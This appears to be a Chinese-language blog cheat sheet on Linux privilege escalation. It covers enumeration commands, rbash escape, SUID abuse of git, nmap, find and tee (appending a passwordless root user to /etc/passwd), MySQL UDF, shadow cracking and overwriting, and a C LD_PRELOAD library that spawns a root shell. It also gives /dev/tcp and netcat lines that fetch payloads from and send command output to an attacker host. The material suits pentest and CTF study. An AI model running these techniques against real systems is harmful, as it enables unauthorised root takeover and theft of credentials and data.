+++
date = '2026-10-17T08:26:44+08:00'
draft = false
title = 'Linux提权'
tags = ["Linux", "提权"]
description = "Linux常见提权方法"
+++

## 终端优化

### 终端升级

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm-color
```

使用rlwrap修复方向键乱码问题

```bash
rlwrap nc -lvnp 443
```

### rbash逃逸

```bash
BASH_CMDS[a]=/bin/bash;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin  # 修复环境变量
```

## 手动枚举
```bash
# 用户枚举
who     # 列出当前所有登录的用户的信息
w       # who详细版
last    # 系统最近的登录记录
# 系统信息枚举
cat /proc/version   # 显示详细内核信息
cat /etc/issue      # 发行版信息
hostnamectl         # 系统信息
# 网络枚举
ip route    # 查看路由表
ip neigh    # 同 ip n ，查看 IPv4 ARP / IPv6 NDP 邻居缓存
arp -a      # 查看ARP缓存
hostname    # 查看机器名称
# 权限枚举
sudo -l     # 查看当前用户sudo权限
getcap -l / 2>/dev/null # 查找具有特殊能力的可执行文件

cat /etc/crontab    # 查看自动任务
echo $PATH          # $PATH告诉shell去哪找命令对应的程序，从左向右一次寻找
env                 # 查看环境变量

ps -ef              # 列出所有进程(e, entire)，以列表形式(f)
ps axjf             # a所有进程、x显示无终端进程、j显示进程数、f列表格式输出
ps aux              # u显示启动进程的用户
top -n 1            # 仅刷新一次

netstat -a          # 显示所有正在监听的端口和已建立的连接
netstat -at         # 列出所有tcp端口
netstat -au         # 列出所有udp端口
netstat -l          # 列出所有正在监听的端口
netstat -s          # 统计网络使用情况
netstat -ano        # n不解析名称(以IP形式显示)，o显示计时器

find / -perm -u=s -type f 2>/dev/null   # 查找所有有s位的文件
which awk perl python ruby gcc nc netcat nmap ftp vi vim…… 2>/dev/null  # 检查是否安装软件并输出其位置，按照$PATH规则查找
cat /etc/fstab      # 查询未挂载磁盘

curl <url> | sh     # 直接执行在线脚本
```

## 便捷命令

### 建立一个简易服务器
```bash
sudo python3 -m http.server port
```

### 无curl命令传文件(利用伪设备)
攻击机执行：
```bash
nc -lvnp port < file.sh
```
靶机执行：
```bash
cat < /dev/tcp/attacker_ip/port # 后可拼接重定向/sh命令
```

### 靶机命令结果传回
靶机执行：
```bash
命令 | nc attacker_ip port
```
攻击机执行：
```bash
nc -lvnp port | tee result.txt  # tee命令将数据分流，同时输出到标准输出和文件中
```

### 原样输出控制字符
```bash
less -r result.txt
```

## SUID提权

### 查找所有具有SUID位的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

### 提权方法

### git 提权
```bash
sudo git help config
```
使 git 被动调用 more 进行显示，再输入 `!/bin/bash` 即可提权

### nmap提权
- 老版本
```bash
namp --interactive
!sh
```
- 新版本
```bash
echo "os.execute('/bin/bash')" > demon.nse
nmap --script=demon.nse
```

### find提权
```bash
find . -exec /bin/bash -p \;
```

### tee提权
tee可以向文件追加写入内容，向passwd中添加新的root用户，再切换到新用户即可完成提权
```bash
echo "test::0:0:: :/bin/bash" | sudo tee -a /etc/passwd
```

## 服务漏洞提权

### MySQL-UDF提权

提权条件：

1. 必须掌握一个具有创建/使用函数权限的MySQL账户
2. secure_file_priv 权限必须为空('')，除非指定的目录恰好就是我们在提权过程中用到的目录(如plugin目录)。该权限用于限制Load data、select into outfile、load_file()操作

提权原理：定义能够以高权限执行系统命令的函数，将该函数导入到数据库中，通过MySQL数据库执行系统命令以实现提权

searchsploit搜索udf利用exploit

```bash
searchsploit mysql udf
```

在靶机中查看secure_file_priv权限状况

```sql
show variables like '%secure_file_priv%';
```

查询plugin目录位置，创建UDF函数时会写入这里

```sql
show variables like '%plugin%';
```

查询所有定义的函数

```sql
select * from mysql.func;
```

执行命系统令

```sql
select your_func('command');
```

## shadow和passwd利用

常见密码哈希

| 前缀 | 类型 |
| ---- | ---- |
| \$1\$ | MD5 |
| \$2a\$/\$2b\$/\$2y\$/\$2\$ | bcrypt或Blowfish |
| \$6\$ | SHA-512 |
| \$P\$ | WordPress的phpass哈希 |

### 可读shadow文件利用提权

要求shadow文件可读
从shadow中提取密码哈希

```bash
cat /etc/shadow | grep ':\$'
```

使用john破解

```bash
sudo john --wordlist=/your/dict/path hash.txt
```

### 可写shadow文件利用提权

要求shadow文件可写
首先备份shadow文件(重要)  
生成sha-512算法的密码哈希

```bash
mkpasswd -m sha-512 PassWord
```

将生成的新密码替换shadow文件中的旧密码即可生效

### 可写passwd文件利用提权

要求passwd文件可写  
首先备份passwd文件(重要)
使用openssl生成哈希

```bash
openssl passwd hacker
```

将passwd中的x替换为生成的哈希，即可生效

## sudo环境变量提权

查看当前用户能执行哪些sudo命令

```bash
sudo -l
```

如果存在`env_reset, env_keep+=LD_PRELOAD`则可利用提权  
`env_reset`：它表示在用户运行 sudo 执行命令时，系统会重置环境变量，只保留当前用户原本环境中的一部分必要变量（如 PATH、HOME 等），以减少通过恶意环境变量进行提权攻击的风险  
`env_keep+=LD_PRELOAD`：这是对 env_reset 的一个例外放行，+= 表示在默认保留列表的基础上追加。

- `env_keep` 允许在 `env_reset` 重置环境时，将指定的环境变量保留下来并带入 sudo 执行的命令环境中。

- `LD_PRELOAD` 是一个用于动态链接库（加载器）的环境变量，允许程序在启动前加载指定的共享库（通常用于调试或 hook 函数）。

可以定义一个共享库shell.c

```c
#include <stdio.h>
#include <sys/types.h>  // 提供unsetenv、setuid、setgid 和 system 函数的声明
#include <stdlib.h>


// _init 是一个特殊的函数。当动态链接器（Dynamic Linker）加载一个共享库（.so）时，会自动调用该库内部的 _init 函数
// 这意味着，只要这个库被加载，函数里的代码就会立刻执行，而不需要像普通程序那样等待 main 函数。
void _init(){
    unsetenv("LD_PRELOAD"); // 清除当前进程环境变量中的 LD_PRELOAD
    setgid(0);              // 显式调用以确保彻底变为root权限
    setuid(0);
    system("/bin/bash");    // 启动一个系统终端
}
```

编译，因为是以共享库的形式使用的，所以要用共享库的编译语法

`-fPIC`：Position Independent Code，即位置无关代码。

- 作用：因为共享库（.so）在内存中加载的地址不是固定的，所以代码不能依赖绝对地址。这个参数告诉编译器生成使用相对地址的代码，这样库才能被加载到内存的任意位置并正常执行。

`-shared`：告诉 GCC 生成一个共享对象（Shared Object），而不是可执行程序。生成的 .so 文件可以被其他程序在运行时动态加载（这正是 LD_PRELOAD 所需要的）。

`-nostartfiles`：不链接系统标准启动文件。放置符号冲突

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

编译后得到shell.so动态链接库，执行一个免密sudo执行的命令(这里以find为例)，在之前定义LD_PRELOAD为编译好的so库，那么就会在执行find前加载so库中的代码，进而执行一个root权限的bash

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```
